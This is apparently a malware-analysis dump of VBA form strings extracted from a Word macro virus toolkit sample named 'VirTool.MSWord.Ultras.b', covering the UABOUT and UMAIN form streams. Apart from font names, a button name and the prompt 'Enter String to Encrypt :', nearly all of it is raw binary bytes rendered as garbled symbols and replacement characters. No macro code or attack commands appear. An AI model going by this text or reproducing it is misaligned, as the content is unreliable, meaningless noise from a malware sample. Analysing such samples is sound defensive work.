-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
##%::<����������^^chhnrrx������������cd�_`�[]�ln����������JL�GI�DG�qs�������������hj�@D�eh�eh�04ы�����������48�6:ʜ��mo�?B�CF�������fi�VW�[]�ab�������������TTYBBF003���������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@㿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ooqAAEDDGFFJ__b���������NNROOSOOT������PPUPPTOOT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ffh55866977:88;88;DDH������88;77:669������003--0**-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���++-++-++-���**,))+((*������""$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|||
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���""$!!#  "���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���  ,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c  {���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wpp����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``t������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������fffDDDQQR������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Small Fonts
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CommandButton1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������47�.2�(,�#(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�TX�QU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ����)-�26�<?�������������IIM++-JJK���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������59�/3�)-�$(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�TX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SV����',�14�;>�������������GGK((*GGH���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������7:�04�*.�NQ�X[����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jn����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�����'+�14�;>�������������CCG##%DDF���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������9<�26�,0�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MQ�y|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����(,�15�<?�������������==@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAJ���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������;>�47�.2�������������CG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������*.�37�>A�������������447
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@T���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������=@�6:�04ǡ�����������ps�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5:�������-1�6:�AD����������zz})),
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@f���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������?B�9<�36�-1�',����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qu�������14�;>�EH����������qqs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@|���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������BE�;>�59�/3�*.����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"吒�������69�@B�JL����������eeh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������EG�>A�8;����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�"&�xz�������<?�EH�PR����������YY[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������GJ�AD�;>�������������il�#(�#(�?D�',�9=�������BE�LN�WX����������MMM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������JL�DG�>A�������������).�(,�5:�z}�-1�26�������IK�ST�]^����������22;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00ۿ��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������MO�GI�BD�=@�8;���྿�.2�.1�}ޱ��47�9<�������PQ�Z[�dev���eeh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������PQ�JL�EG�@C�<?���܎��47�37¦�����;>�@B�ij����WX�aa|``g���VVX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������Ȧ�̣�С�ӟ����쵶䜝ܜ����������գ�Ѧ����������������ˣ������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enter String to Encrypt :�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������翿˿�������������������������������������������������������������������������������������������������������������������������������������������������������������������鿿���������������������������������������������������������������������������������������������������������������������������������������������������⿿ٿ��������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������@@y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ppt���������MMN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "��ɓ��++-..1114������������YY\DDGFFJHHLTTX������������������������>>A::=558002**,$$&������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������  J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P@@����������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

@@A������LLM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȑ��'')++-..0���������;;?>>BAAECCGEEIGGKHHL���������������������==@99<447//1))+##%������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
